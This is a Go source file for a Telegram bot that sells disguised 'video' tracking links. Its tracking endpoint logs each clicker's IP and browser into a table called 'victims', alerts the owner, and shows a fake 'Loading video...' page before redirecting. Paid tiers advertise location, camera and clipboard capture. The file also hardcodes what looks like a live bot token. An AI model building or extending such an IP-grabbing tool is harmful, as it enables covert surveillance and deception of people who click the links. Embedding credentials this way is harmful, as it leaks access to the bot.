package main

import (
	"database/sql"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
	
	"github.com/PaulSonOfLars/gotgbot/v2"
	"github.com/PaulSonOfLars/gotgbot/v2/ext"
	"github.com/PaulSonOfLars/gotgbot/v2/ext/handlers"
	"github.com/PaulSonOfLars/gotgbot/v2/ext/handlers/filters"
	_ "github.com/mattn/go-sqlite3"
)

// Bot token
var BOT_TOKEN = "8036301185:AAGLvdsuEXsxY-LDzRfpH6fEPbC88Zx6-4w"
var OWNER_ID int64 = 6504476778
var db *sql.DB

func main() {
	// Database initialize
	var err error
	db, err = sql.Open("sqlite3", "./bot.db")
	if err != nil {
		log.Fatal(err)
	}
	
	// Create tables
	db.Exec(`CREATE TABLE IF NOT EXISTS users (
		user_id INTEGER PRIMARY KEY,
		username TEXT,
		is_paid INTEGER DEFAULT 0,
		subscription_end DATETIME,
		join_date DATETIME
	)`)
	
	db.Exec(`CREATE TABLE IF NOT EXISTS links (
		link_id TEXT PRIMARY KEY,
		user_id INTEGER,
		original_url TEXT,
		modified_url TEXT,
		created_at DATETIME,
		clicks INTEGER DEFAULT 0
	)`)
	
	db.Exec(`CREATE TABLE IF NOT EXISTS victims (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		link_id TEXT,
		ip TEXT,
		device TEXT,
		timestamp DATETIME
	)`)

	// Bot start
	b, err := gotgbot.NewBot(BOT_TOKEN, nil)
	if err != nil {
		log.Fatal(err)
	}

	dispatcher := ext.NewDispatcher(&ext.DispatcherOpts{
		Error: func(b *gotgbot.Bot, ctx *ext.Context, err error) ext.DispatcherAction {
			log.Println(err)
			return ext.DispatcherActionNoop
		},
	})

	// Commands
	dispatcher.AddHandler(handlers.NewCommand("start", startHandler))
	dispatcher.AddHandler(handlers.NewCommand("terminal:gernatLINK", generateHandler))
	dispatcher.AddHandler(handlers.NewCommand("balance", balanceHandler))
	dispatcher.AddHandler(handlers.NewCommand("subscription", subscriptionHandler))
	
	// Buttons
	dispatcher.AddHandler(handlers.NewMessage(filters.Text("🔗 GENERATE LINK"), generateHandler))
	dispatcher.AddHandler(handlers.NewMessage(filters.Text("💰 BALANCE"), balanceHandler))
	dispatcher.AddHandler(handlers.NewMessage(filters.Text("💎 SUBSCRIPTION"), subscriptionHandler))
	
	// Callback
	dispatcher.AddHandler(handlers.NewCallback(filters.All, callbackHandler))
	
	// Text handler
	dispatcher.AddHandler(handlers.NewMessage(filters.All, processLinkHandler))

	updater := ext.NewUpdater(dispatcher, nil)
	err = updater.StartPolling(b, &ext.PollingOpts{
		DropPendingUpdates: true,
	})
	
	if err != nil {
		log.Fatal(err)
	}
	
	log.Printf("Bot started: @%s", b.User.Username)
	
	// Web server
	http.HandleFunc("/", homePage)
	http.HandleFunc("/track/", trackHandler)
	http.ListenAndServe(":"+os.Getenv("PORT"), nil)
}

// Start command
func startHandler(b *gotgbot.Bot, ctx *ext.Context) error {
	user := ctx.EffectiveSender.User
	
	// Save user
	db.Exec("INSERT OR IGNORE INTO users (user_id, username, join_date) VALUES (?, ?, ?)",
		user.Id, user.Username, time.Now())
	
	// Keyboard
	keyboard := [][]gotgbot.KeyboardButton{
		{{Text: "🔗 GENERATE LINK"}, {Text: "💰 BALANCE"}},
		{{Text: "💎 SUBSCRIPTION"}, {Text: "ℹ️ INFO"}},
	}
	
	msg := "🤖 *VIDEO LINK BOT*\n\n" +
		"Convert video links to tracking links\n" +
		"Free: Basic info\n" +
		"Premium: All features"
	
	ctx.EffectiveMessage.Reply(b, msg, &gotgbot.SendMessageOpts{
		ParseMode: "Markdown",
		ReplyMarkup: gotgbot.ReplyKeyboardMarkup{
			Keyboard:       keyboard,
			ResizeKeyboard: true,
		},
	})
	return nil
}

// Generate link handler
func generateHandler(b *gotgbot.Bot, ctx *ext.Context) error {
	// Check if paid
	var isPaid int
	db.QueryRow("SELECT is_paid FROM users WHERE user_id=?", ctx.EffectiveSender.User.Id).Scan(&isPaid)
	
	features := "🔹 *FREE PLAN*\nIP, Device, Browser"
	if isPaid == 1 {
		features = "🔹 *PREMIUM*\nLocation, Camera, Clipboard, All Info"
	}
	
	// Button
	keyboard := [][]gotgbot.InlineKeyboardButton{{
		{Text: "➕ ENTER VIDEO LINK", CallbackData: "enter_link"},
	}}
	
	msg := fmt.Sprintf("🔗 *LINK GENERATOR*\n\n%s\n\nSend video link:", features)
	
	ctx.EffectiveMessage.Reply(b, msg, &gotgbot.SendMessageOpts{
		ParseMode: "Markdown",
		ReplyMarkup: gotgbot.InlineKeyboardMarkup{
			InlineKeyboard: keyboard,
		},
	})
	return nil
}

// Callback handler
func callbackHandler(b *gotgbot.Bot, ctx *ext.Context) error {
	cb := ctx.Update.CallbackQuery
	cb.Answer(b, nil)
	
	if cb.Data == "enter_link" {
		b.EditMessageText("📤 *Send video link*", &gotgbot.EditMessageTextOpts{
			ChatID:    cb.Message.Chat.Id,
			MessageId: cb.Message.MessageId,
			ParseMode: "Markdown",
		})
	}
	return nil
}

// Process link
func processLinkHandler(b *gotgbot.Bot, ctx *ext.Context) error {
	url := ctx.EffectiveMessage.Text
	
	// Validate URL
	matched, _ := regexp.MatchString(`https?://.+`, url)
	if !matched {
		ctx.EffectiveMessage.Reply(b, "❌ Invalid URL", nil)
		return nil
	}
	
	// Loading animation
	loading, _ := ctx.EffectiveMessage.Reply(b, "⏳ *LOADING 0%*", &gotgbot.SendMessageOpts{
		ParseMode: "Markdown",
	})
	
	for i := 1; i <= 10; i++ {
		time.Sleep(300 * time.Millisecond)
		bar := strings.Repeat("▓", i) + strings.Repeat("░", 10-i)
		b.EditMessageText(fmt.Sprintf("⏳ *LOADING %d%%*\n%s", i*10, bar), &gotgbot.EditMessageTextOpts{
			ChatID:    loading.Chat.Id,
			MessageId: loading.MessageId,
			ParseMode: "Markdown",
		})
	}
	
	// Generate link ID
	linkID := generateID()
	baseURL := "https://" + os.Getenv("RENDER_EXTERNAL_URL")
	modifiedURL := fmt.Sprintf("%s/track/%s", baseURL, linkID)
	
	// Save to DB
	db.Exec("INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
		linkID, ctx.EffectiveSender.User.Id, url, modifiedURL, time.Now())
	
	// Copy button
	keyboard := [][]gotgbot.InlineKeyboardButton{{
		{Text: "📋 COPY LINK", CallbackData: fmt.Sprintf("copy_%s", linkID)},
	}}
	
	msg := fmt.Sprintf("✅ *LINK READY*\n\n`%s`", modifiedURL)
	
	b.EditMessageText(msg, &gotgbot.EditMessageTextOpts{
		ChatID:      loading.Chat.Id,
		MessageId:   loading.MessageId,
		ParseMode:   "Markdown",
		ReplyMarkup: gotgbot.InlineKeyboardMarkup{InlineKeyboard: keyboard},
	})
	
	return nil
}

// Balance handler
func balanceHandler(b *gotgbot.Bot, ctx *ext.Context) error {
	var isPaid int
	var endDate string
	
	db.QueryRow("SELECT is_paid, subscription_end FROM users WHERE user_id=?", 
		ctx.EffectiveSender.User.Id).Scan(&isPaid, &endDate)
	
	if isPaid == 1 {
		msg := fmt.Sprintf("💎 *Premium Active*\nValid till: %s", endDate[:10])
		ctx.EffectiveMessage.Reply(b, msg, &gotgbot.SendMessageOpts{ParseMode: "Markdown"})
	} else {
		ctx.EffectiveMessage.Reply(b, "🆓 *Free User*\nUpgrade: /subscription", 
			&gotgbot.SendMessageOpts{ParseMode: "Markdown"})
	}
	return nil
}

// Subscription handler
func subscriptionHandler(b *gotgbot.Bot, ctx *ext.Context) error {
	keyboard := [][]gotgbot.InlineKeyboardButton{{
		{Text: "⭐ PAY 2 STARS", CallbackData: "pay"},
	}}
	
	msg := "💎 *Premium - 2 Stars*\n\n• Full device info\n• Location\n• Camera\n• 30 days"
	
	ctx.EffectiveMessage.Reply(b, msg, &gotgbot.SendMessageOpts{
		ParseMode: "Markdown",
		ReplyMarkup: gotgbot.InlineKeyboardMarkup{
			InlineKeyboard: keyboard,
		},
	})
	return nil
}

// Track handler
func trackHandler(w http.ResponseWriter, r *http.Request) {
	linkID := strings.TrimPrefix(r.URL.Path, "/track/")
	ip := r.RemoteAddr
	agent := r.UserAgent()
	
	// Save victim
	db.Exec("INSERT INTO victims (link_id, ip, device, timestamp) VALUES (?, ?, ?, ?)",
		linkID, ip, agent, time.Now())
	
	// Update clicks
	db.Exec("UPDATE links SET clicks = clicks + 1 WHERE link_id = ?", linkID)
	
	// Get original URL
	var url string
	var userID int64
	db.QueryRow("SELECT original_url, user_id FROM links WHERE link_id=?", linkID).Scan(&url, &userID)
	
	// Notify owner
	go func() {
		bot, _ := gotgbot.NewBot(BOT_TOKEN, nil)
		bot.SendMessage(OWNER_ID, fmt.Sprintf("📊 New click\nIP: %s", ip), nil)
	}()
	
	// HTML page
	html := fmt.Sprintf(`
	<html>
	<head><script>setTimeout(function(){window.location.href="%s"},3000)</script></head>
	<body style="background:black;color:white;text-align:center;padding:50px">
		<h2>Loading video...</h2>
		<div style="border:3px solid #f3f3f3;border-top:3px solid #3498db;border-radius:50%%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto"></div>
		<style>@keyframes spin{0%%{transform:rotate(0)}100%%{transform:rotate(360)}}</style>
	</body>
	</html>`, url)
	
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(html))
}

func homePage(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("Bot is running!"))
}

func generateID() string {
	b := make([]byte, 4)
	rand.Read(b)
	return hex.EncodeToString(b)
}
